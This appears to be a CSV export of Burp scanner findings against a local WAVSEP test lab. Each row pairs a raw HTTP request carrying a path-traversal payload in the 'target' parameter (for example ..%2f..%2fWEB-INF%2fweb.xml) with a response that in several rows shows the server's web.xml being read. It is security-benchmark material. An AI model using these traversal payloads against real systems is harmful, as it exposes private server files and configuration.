http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case34-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case34-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case34-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:18 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case51-LFI-ContextStream-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case51-LFI-ContextStream-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f.%2fnone892j3kd.txt HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:52 GMT
Connection: close
Content-Length: 1644

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case20-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-SlashPathReq-Read.jsp?target=.%2f HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:08:58 GMT
Connection: close
Content-Length: 1665

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case56-LFI-FileClass-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case56-LFI-FileClass-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-NoPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 18
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case56-LFI-FileClass-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-NoPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:17 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case34-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case34-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-500Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:07:23 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case25-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case25-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 77
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case25-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-500Error%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:51 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case59-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case59-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case59-LFI-FileClass-FilenameContext-UnixTraversalRemoval-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%5c.%5cdefault.txt","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:42 GMT
Connection: close
Content-Length: 1785

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case33-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case33-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp?target=..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:08:15 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 81
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-200Valid%2f..%2f..%2f..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:11 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case25-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case25-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 80
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case25-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-302Redirect%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:26 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case46-LFI-ContextStream-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case46-LFI-ContextStream-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 80
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case46-LFI-ContextStream-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-302Redirect%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:32 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
